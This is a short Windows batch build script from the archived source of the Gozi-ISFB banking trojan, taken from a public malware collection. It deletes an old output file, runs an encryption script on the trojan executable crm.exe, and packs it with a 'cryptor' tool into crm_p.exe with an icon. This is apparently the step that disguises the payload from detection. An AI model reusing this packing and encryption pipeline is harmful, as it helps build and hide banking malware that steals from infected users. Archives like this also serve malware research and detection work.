:: ------------------------------------------------------------
:: name      Gozi-ISFB
:: type      trojan
:: cve       —
:: year      unknown
:: os        Windows
:: authors   unknown
:: source    RamadhanAmizudin/malware
:: archived  RamadhanAmizudin, krisyotam (2026)
:: notes     —
:: ------------------------------------------------------------
del %1release\crm_p.exe

call %1\encrypts.bat %1 %2 crm.exe

cd %1cryptor
mpack %1release\crm.exe %1release\crm_p.exe crm.ico
